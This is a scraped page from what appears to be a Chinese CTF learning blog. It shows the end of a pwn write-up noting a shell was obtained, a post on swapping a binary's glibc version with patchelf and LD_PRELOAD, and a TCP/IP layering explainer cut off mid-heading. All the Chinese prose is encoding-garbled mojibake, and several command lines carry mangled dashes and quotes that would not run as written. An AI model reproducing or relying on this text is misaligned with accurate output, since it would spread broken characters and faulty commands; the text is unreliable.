<p>ç»§ç»­4æ‰§è¡Œ<code>shell()</code>æˆåŠŸ</p>
<p>åŒæ—¶å¯ä»¥åˆ©ç”¨<code>interactive mode</code>å’Œ<code>gdb.attach()</code></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162721541.png" alt="image-20251112162721541"></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162730716.png" alt="image-20251112162730716"></p>
<p>è¿™é‡Œå°±æ˜¯è¯´å½“å†™è„šæœ¬çš„æ—¶å€™å¯ä»¥åˆ©ç”¨<code>interactive mode</code> ç»§ç»­å¾€ä¸‹æ‰§è¡Œ<code>gdb.attach</code>åé¢çš„å†…å®¹ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/09/25/%E6%9B%B4%E6%8D%A2glibc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/tou.jpg">
      <meta itemprop="name" content="JC">
      <meta itemprop="description" content="Ê•Â´â€¢á´¥â€¢Â Ê”">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mvegetable'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/09/25/%E6%9B%B4%E6%8D%A2glibc/" class="post-title-link" itemprop="url">glibc ç‰ˆæœ¬</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-09-25 22:39:44" itemprop="dateCreated datePublished" datetime="2025-09-25T22:39:44+08:00">2025-09-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2025-12-01 15:38:50" itemprop="dateModified" datetime="2025-12-01T15:38:50+08:00">2025-12-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>1.6k</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="æ›´æ¢glibcç‰ˆæœ¬"><a href="#æ›´æ¢glibcç‰ˆæœ¬" class="headerlink" title="æ›´æ¢glibcç‰ˆæœ¬"></a>æ›´æ¢glibcç‰ˆæœ¬</h1><h2 id="1-ä¸‹è½½glibc-all-in-one"><a href="#1-ä¸‹è½½glibc-all-in-one" class="headerlink" title="1.ä¸‹è½½glibc_all_in_one"></a>1.ä¸‹è½½glibc_all_in_one</h2><p>æ­¥éª¤ 1ï¼šå®‰è£…ä¾èµ–å·¥å…· </p>
<p>bash: sudo apt install patchelf git </p>
<p>æ­¥éª¤ 2ï¼šä¸‹è½½ glibc-all-in-one </p>
<p>bash: git clone <a target="_blank" rel="noopener" href="https://github.com/matrix1001/glibc-all-in-one.git">https://github.com/matrix1001/glibc-all-in-one.git</a> </p>
<p>cd glibc-all-in-one</p>
<h2 id="2-ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„glibc-2-23ä¸ºä¾‹"><a href="#2-ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„glibc-2-23ä¸ºä¾‹" class="headerlink" title="2.ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„glibc(2.23ä¸ºä¾‹)"></a>2.ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„glibc(2.23ä¸ºä¾‹)</h2><p>.&#x2F;update_list</p>
<p>cat list | grep 2.23</p>
<p>.&#x2F;download 2.23-0ubuntu3_amd64</p>
<p><strong>é—®é¢˜</strong>ï¼š</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20250725165210090.png" alt="image-20250725165210090"></p>
<p>å‡ºç°<code>sudo: unable to execute ./update_list: No such file or directory</code>é”™è¯¯ï¼Œçœ‹ä¼¼çŸ›ç›¾ï¼ˆ<code>ls</code>æ˜æ˜æ˜¾ç¤ºæ–‡ä»¶å­˜åœ¨ï¼‰ï¼Œå®é™…æ˜¯å› ä¸º<code>update_list</code>è„šæœ¬çš„<strong>è§£é‡Šå™¨è·¯å¾„æ— æ•ˆ</strong>æˆ–è„šæœ¬æœ¬èº«å­˜åœ¨æŸåã€‚å…·ä½“è§£å†³æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<p>1.æ£€æŸ¥<code>update_list</code>è„šæœ¬çš„å¤´éƒ¨è§£é‡Šå™¨</p>
<p># æŸ¥çœ‹è„šæœ¬é¦–è¡Œ head -n 1 .&#x2F;update_list</p>
<p>æ­£å¸¸è¾“å‡ºåº”ä¸ºï¼š</p>
<p>#!&#x2F;bin&#x2F;bash</p>
<h2 id="3-æ›´æ¢"><a href="#3-æ›´æ¢" class="headerlink" title="3.æ›´æ¢"></a>3.æ›´æ¢</h2><p>â¯ patchelf â€“set-interpreter &#x2F;home&#x2F;jc&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_i386&#x2F;ld-2.23.so <br>         â€“set-rpath &#x2F;home&#x2F;jc&#x2F;glibc-all-in-one&#x2F;&#x2F;libs&#x2F;2.23-0ubuntu3_i386&#x2F; <br>         .&#x2F;pwn160</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20250725165549637.png" alt="image-20250725165549637"></p>
<p>æ³¨æ„è·¯å¾„ï¼ï¼ï¼</p>
<h2 id="4-æ£€æŸ¥"><a href="#4-æ£€æŸ¥" class="headerlink" title="4.æ£€æŸ¥"></a>4.æ£€æŸ¥</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20250725165853663.png" alt="image-20250725165853663"></p>
<h2 id="5-æ¢å›å»"><a href="#5-æ¢å›å»" class="headerlink" title="5.æ¢å›å»"></a>5.æ¢å›å»</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20250725170102584.png" alt="image-20250725170102584"></p>
<p>1.patchelf â€“remove-rpath .&#x2F;hacknote  </p>
<p>æ¸…é™¤ä¹‹å‰é€šè¿‡<code>--set-rpath</code>æŒ‡å®šçš„ glibc åº“è·¯å¾„</p>
<p>2.patchelf â€“set-interpreter &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-linux.so.2 .&#x2F;hacknote</p>
<p>æ¢å¤ç³»ç»Ÿé»˜è®¤çš„åŠ¨æ€é“¾æ¥å™¨</p>
<p>64 ä½ç¨‹åºçš„é»˜è®¤é“¾æ¥å™¨æ˜¯<code>/lib64/ld-linux-x86-64.so.2</code>ï¼Œä½† 32 ä½ç¨‹åºå¿…é¡»ä½¿ç”¨ 32 ä½é“¾æ¥å™¨<code>/lib/i386-linux-gnu/ld-linux.so.2</code>ï¼ˆè‹¥è·¯å¾„ä¸åŒï¼Œå¯é€šè¿‡<code>dpkg -L libc6:i386 | grep ld-linux</code>æŸ¥è¯¢ï¼‰ã€‚</p>
<h1 id="å¦ä¸€ç§æ–¹æ³•"><a href="#å¦ä¸€ç§æ–¹æ³•" class="headerlink" title="å¦ä¸€ç§æ–¹æ³•"></a>å¦ä¸€ç§æ–¹æ³•</h1><h2 id="ç¼–è¯‘ä¸åŒç‰ˆæœ¬çš„glibc"><a href="#ç¼–è¯‘ä¸åŒç‰ˆæœ¬çš„glibc" class="headerlink" title="ç¼–è¯‘ä¸åŒç‰ˆæœ¬çš„glibc"></a>ç¼–è¯‘ä¸åŒç‰ˆæœ¬çš„glibc</h2><p>é¦–å…ˆè¦ä½¿ç”¨ä¸åŒç‰ˆæœ¬çš„glibcï¼Œæˆ‘ä»¬éœ€è¦æœ‰ä¸åŒç‰ˆæœ¬çš„ glibc å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ libc.so å’Œ ld.soã€‚è¿™ä¸¤ä¸ªæ–‡ä»¶æ˜¯ç¨‹åºè¿è¡Œæ—¶æ‰€éœ€è¦çš„æ–‡ä»¶æŒ‰ã€‚</p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥åœ¨ç½‘ä¸Šæ‰¾å·²ç»ç¼–è¯‘å¥½çš„libcï¼Œä½†æ˜¯æ‰¾ä¸åˆ°æ—¶è‡ªå·±ç¼–è¯‘çš„æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<p>glibc-all-in-oneï¼šæ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œé‡Œé¢æœ‰å„ç§ç‰ˆæœ¬çš„glibc æºç ã€‚</p>
<p>ç„¶åç¼–è¯‘glibc çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<p>git clone <a target="_blank" rel="noopener" href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p>
<p>cd glibc-all-in-one</p>
<p>chmod 777 build download extract</p>
<p>sudo .&#x2F;build 2.29 amd64     #ç¼–è¯‘glibc<br>sudo .&#x2F;build 2.27 amd64<br>sudo .&#x2F;build 2.23 amd64</p>
<h2 id="åŠ è½½glibc"><a href="#åŠ è½½glibc" class="headerlink" title="åŠ è½½glibc"></a>åŠ è½½glibc</h2><p>å¯¹äºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ LD_PRELOAD æ¥æŒ‡å®šå…¶ä½¿ç”¨ å¯¹åº”ç‰ˆæœ¬çš„ glibcã€‚ä½†æ˜¯è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œè¿˜å¾—æŒ‡å®šä¸€ä¸ªå¯¹åº”ç‰ˆæœ¬çš„ ld.soï¼Œä¸ç„¶ å¯èƒ½ä¼šå‡ºç°é—®é¢˜ã€‚</p>
<p>ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼Œæˆ‘ä¹ æƒ¯å°† ld.so å’Œ libc.so.6 æ”¾åˆ°ä¸ç¨‹åºåŒç›®å½•ä¸‹ã€‚ä¹Ÿå¯ä»¥è‡ªå·±æ”¹å˜è·¯å¾„ã€‚</p>
<p>p &#x3D; process([â€œld.soâ€, â€œ.&#x2F;testâ€],<br>            env&#x3D;{â€œLD_PRELOADâ€:â€libc.so.6â€})<br>é€šè¿‡ä¸Šé¢çš„æ“ä½œï¼Œæˆ‘ä»¬å°±å¯ä»¥æŒ‡å®š test åŠ è½½å¯¹åº”ç‰ˆæœ¬çš„ glibcã€‚</p>
<h2 id="æ›´æ¢åŠ¨æ€é“¾æ¥åº“"><a href="#æ›´æ¢åŠ¨æ€é“¾æ¥åº“" class="headerlink" title="æ›´æ¢åŠ¨æ€é“¾æ¥åº“"></a>æ›´æ¢åŠ¨æ€é“¾æ¥åº“</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201153641147.png" alt="image-20251201153641147"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/07/26/TCP-IP-%E5%8D%8F%E8%AE%AE%E6%A0%88%E7%9A%84%E5%88%86%E5%B1%82%E7%BB%93%E6%9E%84/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/tou.jpg">
      <meta itemprop="name" content="JC">
      <meta itemprop="description" content="Ê•Â´â€¢á´¥â€¢Â Ê”">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mvegetable'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/07/26/TCP-IP-%E5%8D%8F%E8%AE%AE%E6%A0%88%E7%9A%84%E5%88%86%E5%B1%82%E7%BB%93%E6%9E%84/" class="post-title-link" itemprop="url">TCP/IP åè®®æ ˆçš„åˆ†å±‚ç»“æ„</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-07-26 01:57:26 / ä¿®æ”¹æ—¶é—´ï¼š01:59:02" itemprop="dateCreated datePublished" datetime="2025-07-26T01:57:26+08:00">2025-07-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>3.4k</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TCP&#x2F;IP åè®®æ ˆ</p>
<p>TCP&#x2F;IP åè®®æ ˆæ˜¯äº’è”ç½‘çš„æ ¸å¿ƒé€šä¿¡æ¡†æ¶ï¼Œå®ƒå®šä¹‰äº†è®¡ç®—æœºä¹‹é—´å¦‚ä½•é€šè¿‡ç½‘ç»œè¿›è¡Œæ•°æ®ä¼ è¾“çš„ä¸€ç³»åˆ—è§„åˆ™ã€‚è¿™ä¸ªåè®®æ ˆé‡‡ç”¨åˆ†å±‚ç»“æ„è®¾è®¡ï¼Œå°†å¤æ‚çš„ç½‘ç»œé€šä¿¡è¿‡ç¨‹åˆ†è§£ä¸ºå¤šä¸ªç‹¬ç«‹çš„åŠŸèƒ½å±‚ï¼Œæ¯å±‚ä¸“æ³¨äºç‰¹å®šä»»åŠ¡ï¼Œå¹¶é€šè¿‡æ¥å£ä¸ä¸Šä¸‹å±‚åä½œã€‚</p>
<h3 id="TCP-IP-åè®®æ ˆçš„åˆ†å±‚ç»“æ„ï¼ˆ4-å±‚æ¨¡å‹ï¼‰"><a href="#TCP-IP-åè®®æ ˆçš„åˆ†å±‚ç»“æ„ï¼ˆ4-å±‚æ¨¡å‹ï¼‰" class="headerlink" title="TCP&#x2F;IP åè®®æ ˆçš„åˆ†å±‚ç»“æ„ï¼ˆ4 å±‚æ¨¡å‹ï¼‰"></a>TCP&#x2F;IP åè®®æ ˆçš„åˆ†å±‚ç»“æ„ï¼ˆ4 å±‚æ¨¡å‹ï¼‰</h3><p>é€šå¸¸å°† TCP&#x2F;IP åè®®æ ˆåˆ†ä¸º 4 å±‚ï¼ˆä»åº•å±‚åˆ°ä¸Šå±‚ï¼‰ï¼Œæ¯å±‚åŒ…å«ä¸åŒçš„åè®®ï¼Œå…±åŒå®Œæˆæ•°æ®çš„å°è£…ã€ä¼ è¾“å’Œè§£æï¼š</p>
<h4 id="1-ç½‘ç»œæ¥å£å±‚ï¼ˆNetwork-Interface-Layerï¼‰"><a href="#1-ç½‘ç»œæ¥å£å±‚ï¼ˆNetwork-Interface-Layerï¼‰" class="headerlink" title="1. ç½‘ç»œæ¥å£å±‚ï¼ˆNetwork Interface Layerï¼‰"></a>1. ç½‘ç»œæ¥å£å±‚ï¼ˆNetwork Interface Layerï¼‰</h4><ul>
<li><p><strong>ä½œç”¨</strong>ï¼šè´Ÿè´£å°†æ•°æ®é€šè¿‡ç‰©ç†ç½‘ç»œï¼ˆå¦‚ä»¥å¤ªç½‘ã€Wi-Fiï¼‰ä¼ è¾“ï¼Œå¤„ç†ç¡¬ä»¶ç›¸å…³çš„é€šä¿¡ç»†èŠ‚ã€‚</p>
</li>
<li><p>æ ¸å¿ƒåè®® &#x2F; æŠ€æœ¯</p>
<p>ï¼š</p>
<ul>
<li>ä»¥å¤ªç½‘ï¼ˆEthernetï¼‰ï¼šå®šä¹‰äº†å±€åŸŸç½‘å†…æ•°æ®ä¼ è¾“çš„å¸§æ ¼å¼ï¼ˆåŒ…å« MAC åœ°å€ã€æ ¡éªŒç ç­‰ï¼‰ã€‚</li>
<li>Wi-Fiï¼ˆ802.11 åè®®ï¼‰ï¼šæ— çº¿å±€åŸŸç½‘çš„é€šä¿¡æ ‡å‡†ã€‚</li>
<li>ARPï¼ˆåœ°å€è§£æåè®®ï¼‰ï¼šå°† IP åœ°å€è½¬æ¢ä¸ºç‰©ç† MAC åœ°å€ï¼Œç”¨äºå±€åŸŸç½‘å†…è®¾å¤‡å®šä½ã€‚</li>
</ul>
</li>
<li><p><strong>æ•°æ®å•å…ƒ</strong>ï¼šå¸§ï¼ˆFrameï¼‰</p>
</li>
</ul>
<h4 id="2-ç½‘ç»œå±‚ï¼ˆInternet-Layerï¼‰"><a href="#2-ç½‘ç»œå±‚ï¼ˆInternet-Layerï¼‰" class="headerlink" title="2. ç½‘ç»œå±‚ï¼ˆInternet Layerï¼‰"></a>2. ç½‘ç»œå±‚ï¼ˆInternet Layerï¼‰</h4><ul>
<li><p><strong>ä½œç”¨</strong>ï¼šè´Ÿè´£è·¨ç½‘ç»œï¼ˆå¦‚å±€åŸŸç½‘åˆ°å¹¿åŸŸç½‘ï¼‰çš„æ•°æ®è·¯ç”±å’Œè½¬å‘ï¼Œç¡®ä¿æ•°æ®ä»æºè®¾å¤‡èƒ½æ‰¾åˆ°ç›®æ ‡åœ°å€ã€‚</p>
</li>
<li><p>æ ¸å¿ƒåè®®</p>
<p>ï¼š</p>
<ul>
<li>IPï¼ˆç½‘é™…åè®®ï¼‰ï¼šæœ€æ ¸å¿ƒçš„åè®®ï¼Œå®šä¹‰äº† IP åœ°å€ï¼ˆå¦‚ IPv4ã€IPv6ï¼‰ï¼Œè´Ÿè´£æ•°æ®çš„åˆ†ç»„å’Œè·¯ç”±ã€‚</li>
<li>ICMPï¼ˆäº’è”ç½‘æ§åˆ¶æ¶ˆæ¯åè®®ï¼‰ï¼šç”¨äºç½‘ç»œè¯Šæ–­ï¼ˆå¦‚ <code>ping</code> å‘½ä»¤é€šè¿‡ ICMP æ£€æµ‹ä¸»æœºå¯è¾¾æ€§ï¼‰ã€‚</li>
<li>IGMPï¼ˆäº’è”ç½‘ç»„ç®¡ç†åè®®ï¼‰ï¼šç”¨äºå¤šæ’­é€šä¿¡ï¼ˆå¦‚è§†é¢‘ä¼šè®®ï¼‰ã€‚</li>
</ul>
</li>
<li><p><strong>æ•°æ®å•å…ƒ</strong>ï¼šæ•°æ®åŒ…ï¼ˆPacketï¼‰</p>
</li>
</ul>
<h4 id="3-ä¼ è¾“å±‚ï¼ˆTransport-Layerï¼‰"><a href="#3-ä¼ è¾“å±‚ï¼ˆTransport-Layerï¼‰" class="headerlink" title="3. ä¼ è¾“å±‚ï¼ˆTransport Layerï¼‰"></a>3. ä¼ è¾“å±‚ï¼ˆTransport Layerï¼‰</h4><ul>
<li><p><strong>ä½œç”¨</strong>ï¼šæä¾›ç«¯åˆ°ç«¯çš„å¯é æ•°æ®ä¼ è¾“ï¼Œå¤„ç†æ•°æ®çš„åˆ†æ®µã€é‡ç»„ã€æµé‡æ§åˆ¶ç­‰ã€‚</p>
</li>
<li><p>æ ¸å¿ƒåè®®</p>
<p>ï¼š</p>
<ul>
<li>TCPï¼ˆä¼ è¾“æ§åˆ¶åè®®ï¼‰ï¼šé¢å‘è¿æ¥çš„å¯é åè®®ï¼Œé€šè¿‡ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥ã€åºåˆ—å·ä¿è¯é¡ºåºã€é‡ä¼ æœºåˆ¶å¤„ç†ä¸¢åŒ…ï¼Œé€‚ç”¨äºå¯¹å¯é æ€§è¦æ±‚é«˜çš„åœºæ™¯ï¼ˆå¦‚ç½‘é¡µã€æ–‡ä»¶ä¼ è¾“ï¼‰ã€‚</li>
<li>UDPï¼ˆç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰ï¼šæ— è¿æ¥çš„ä¸å¯é åè®®ï¼Œä¸ä¿è¯æ•°æ®åˆ°è¾¾é¡ºåºå’Œå®Œæ•´æ€§ï¼Œä½†ä½†ä¼ è¾“é€Ÿåº¦å¿«ï¼Œé€‚ç”¨äºå®æ—¶æ€§è¦æ±‚é«˜çš„åœºæ™¯ï¼ˆå¦‚è§†é¢‘é€šè¯ã€æ¸¸æˆï¼‰ã€‚</li>
</ul>
</li>
<li><p><strong>æ•°æ®å•å…ƒ</strong>ï¼šTCP ç§°ä¸ºæ®µï¼ˆSegmentï¼‰ï¼ŒUDP ç§°ä¸ºæ•°æ®æŠ¥ï¼ˆDatagramï¼‰</p>
</li>
</ul>
<h4 id="4-åº”ç”¨å±‚ï¼ˆApplication-Layerï¼‰"><a href="#4-åº”ç”¨å±‚ï¼ˆApplication-Layerï¼‰" class="headerlink" title="4. åº”ç”¨å±‚ï¼ˆApplication Layerï¼‰"></a>4. åº”ç”¨å±‚ï¼ˆApplication Layerï¼‰</h4><ul>
<li><p><strong>ä½œç”¨</strong>ï¼šç›´æ¥ä¸ºç”¨æˆ·åº”ç”¨ç¨‹åºæä¾›æœåŠ¡ï¼Œå®šä¹‰äº†æ•°æ®äº¤äº’çš„æ ¼å¼å’Œè§„åˆ™ã€‚</p>
</li>
<li><p>æ ¸å¿ƒåè®®</p>
<p>ï¼š</p>
<ul>
<li>HTTP&#x2F;HTTPSï¼šç”¨äº Web é¡µé¢ä¼ è¾“ï¼ˆå¦‚æµè§ˆå™¨è®¿é—®ç½‘ç«™ï¼‰ã€‚</li>
<li>FTP&#x2F;SFTPï¼šç”¨äºæ–‡ä»¶ä¼ è¾“ã€‚</li>
<li>SMTP&#x2F;POP3&#x2F;IMAPï¼šç”¨äºé‚®ä»¶å‘é€å’Œæ¥æ”¶ã€‚</li>
<li>DNSï¼šç”¨äºå°†åŸŸåï¼ˆå¦‚ <code>example.com</code>ï¼‰è§£æä¸º IP åœ°å€ã€‚</li>
<li>SSH&#x2F;Telnetï¼šç”¨äºè¿œç¨‹ç™»å½•æœåŠ¡å™¨ã€‚</li>
</ul>
</li>
<li><p><strong>æ•°æ®å•å…ƒ</strong>ï¼šæ•°æ®ï¼ˆDataï¼‰</p>
</li>
</ul>
<h3 id="æ•°æ®ä¼ è¾“çš„å°è£…ä¸è§£å°è£…è¿‡ç¨‹"><a href="#æ•°æ®ä¼ è¾“çš„å°è£…ä¸è§£å°è£…è¿‡ç¨‹" class="headerlink" title="æ•°æ®ä¼ è¾“çš„å°è£…ä¸è§£å°è£…è¿‡ç¨‹"></a>æ•°æ®ä¼ è¾“çš„å°è£…ä¸è§£å°è£…è¿‡ç¨‹</h3><p>TCP&#x2F;IP åè®®æ ˆé€šè¿‡ â€œå°è£…â€ å’Œ â€œè§£å°è£…â€ å®ç°æ•°æ®ä¼ è¾“ï¼Œä»¥æµè§ˆå™¨è®¿é—®ç½‘ç«™ä¸ºä¾‹ï¼š</p>
<ol>
<li><strong>å°è£…ï¼ˆå‘é€ç«¯ï¼‰</strong>ï¼š<ul>
<li>åº”ç”¨å±‚ï¼šæµè§ˆå™¨ç”Ÿæˆ HTTP è¯·æ±‚æ•°æ®ï¼ˆå¦‚ <code>GET /index.html</code>ï¼‰ã€‚</li>
<li>ä¼ è¾“å±‚ï¼šTCP ä¸ºæ•°æ®æ·»åŠ å¤´éƒ¨ï¼ˆæºç«¯å£ã€ç›®æ ‡ç«¯å£ã€åºåˆ—å·ç­‰ï¼‰ï¼Œå½¢æˆ TCP æ®µã€‚</li>
<li>ç½‘ç»œå±‚ï¼šIP ä¸º TCP æ®µæ·»åŠ å¤´éƒ¨ï¼ˆæº IPã€ç›®æ ‡ IPã€è·¯ç”±ä¿¡æ¯ç­‰ï¼‰ï¼Œå½¢æˆ IP æ•°æ®åŒ…ã€‚</li>
<li>ç½‘ç»œæ¥å£å±‚ï¼šä»¥å¤ªç½‘ä¸º IP åŒ…æ·»åŠ å¤´éƒ¨ï¼ˆæº MACã€ç›®æ ‡ MACï¼‰å’Œå°¾éƒ¨ï¼ˆæ ¡éªŒç ï¼‰ï¼Œå½¢æˆå¸§ï¼Œé€šè¿‡ç‰©ç†ä»‹è´¨ï¼ˆç½‘çº¿ &#x2F; Wi-Fiï¼‰å‘é€ã€‚</li>
</ul>
</li>
<li><strong>è§£å°è£…ï¼ˆæ¥æ”¶ç«¯ï¼‰</strong>ï¼š<ul>
<li>ç½‘ç»œæ¥å£å±‚ï¼šæ¥æ”¶å¸§ï¼Œæ ¡éªŒå¹¶ç§»é™¤ä»¥å¤ªç½‘å¤´éƒ¨ï¼Œå°† IP æ•°æ®åŒ…äº¤ç»™ç½‘ç»œå±‚ã€‚</li>
<li>ç½‘ç»œå±‚ï¼šè§£æ IP å¤´éƒ¨ï¼Œç¡®è®¤ç›®æ ‡ IP åŒ¹é…åï¼Œç§»é™¤ IP å¤´éƒ¨ï¼Œå°† TCP æ®µäº¤ç»™ä¼ è¾“å±‚ã€‚</li>
<li>ä¼ è¾“å±‚ï¼šTCP éªŒè¯åºåˆ—å·ï¼Œé‡ç»„åˆ†æ®µæ•°æ®ï¼Œç§»é™¤ TCP å¤´éƒ¨ï¼Œå°† HTTP æ•°æ®äº¤ç»™åº”ç”¨å±‚ã€‚</li>
<li>åº”ç”¨å±‚ï¼šæœåŠ¡å™¨è§£æ HTTP è¯·æ±‚ï¼Œå¤„ç†åè¿”å›å“åº”ï¼Œé‡å¤å°è£…è¿‡ç¨‹å›ä¼ å®¢æˆ·ç«¯ã€‚</li>
</ul>
</li>
</ol>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>TCP&#x2F;IP åè®®æ ˆæ˜¯äº’è”ç½‘çš„ â€œäº¤é€šè§„åˆ™â€ï¼Œé€šè¿‡åˆ†å±‚è®¾è®¡å®ç°äº†åŠŸèƒ½è§£è€¦ï¼š</p>
<ul>
<li>åº•å±‚ï¼ˆç½‘ç»œæ¥å£å±‚ã€ç½‘ç»œå±‚ï¼‰è´Ÿè´£ â€œæ•°æ®æ€ä¹ˆä¼ â€ï¼ˆç‰©ç†ä¼ è¾“ã€è·¯ç”±ï¼‰ï¼›</li>
<li>ä¸Šå±‚ï¼ˆä¼ è¾“å±‚ã€åº”ç”¨å±‚ï¼‰è´Ÿè´£ â€œä¼ ä»€ä¹ˆæ•°æ®â€ï¼ˆå¯é ä¼ è¾“ã€åº”ç”¨äº¤äº’ï¼‰ã€‚</li>
</ul>
<p>è¿™ç§ç»“æ„ä½¿å¾—ä¸åŒå‚å•†çš„è®¾å¤‡ï¼ˆå¦‚ç”µè„‘ã€è·¯ç”±å™¨ã€æœåŠ¡å™¨ï¼‰èƒ½éµå¾ªç»Ÿä¸€æ ‡å‡†é€šä¿¡ï¼Œæ˜¯äº’è”ç½‘äº’è”äº’é€šçš„åŸºç¡€ã€‚</p>
<p>æˆ‘ä»¬ä»¥æ—¥å¸¸ç”Ÿæ´»ä¸­ **â€œæµè§ˆç½‘é¡µï¼ˆHTTP è¯·æ±‚ï¼‰â€<strong>ä¸ºä¾‹ï¼Œè¯¦ç»†è¯´æ˜ TCP&#x2F;IP åè®®æ ˆå„å±‚ï¼ˆåº”ç”¨å±‚ã€ä¼ è¾“å±‚ã€ç½‘ç»œå±‚ã€ç½‘ç»œæ¥å£å±‚ï¼‰çš„åä½œå…³ç³»ï¼Œä»¥åŠæ•°æ®åœ¨å„å±‚ä¹‹é—´çš„</strong>å°è£…ã€ä¼ é€’ã€è§£å°è£… ** è¿‡ç¨‹ã€‚</p>
<h3 id="åœºæ™¯ï¼šç”¨æˆ·åœ¨æµè§ˆå™¨è¾“å…¥www-example-comå¹¶å›è½¦ï¼Œè¯·æ±‚åŠ è½½ç½‘é¡µ"><a href="#åœºæ™¯ï¼šç”¨æˆ·åœ¨æµè§ˆå™¨è¾“å…¥www-example-comå¹¶å›è½¦ï¼Œè¯·æ±‚åŠ è½½ç½‘é¡µ" class="headerlink" title="åœºæ™¯ï¼šç”¨æˆ·åœ¨æµè§ˆå™¨è¾“å…¥www.example.comå¹¶å›è½¦ï¼Œè¯·æ±‚åŠ è½½ç½‘é¡µ"></a>åœºæ™¯ï¼šç”¨æˆ·åœ¨æµè§ˆå™¨è¾“å…¥<code>www.example.com</code>å¹¶å›è½¦ï¼Œè¯·æ±‚åŠ è½½ç½‘é¡µ</h3><h4 id="æ­¥éª¤-1ï¼šåº”ç”¨å±‚ï¼ˆHTTP-åè®®ï¼‰ç”Ÿæˆæ•°æ®"><a href="#æ­¥éª¤-1ï¼šåº”ç”¨å±‚ï¼ˆHTTP-åè®®ï¼‰ç”Ÿæˆæ•°æ®" class="headerlink" title="æ­¥éª¤ 1ï¼šåº”ç”¨å±‚ï¼ˆHTTP åè®®ï¼‰ç”Ÿæˆæ•°æ®"></a>æ­¥éª¤ 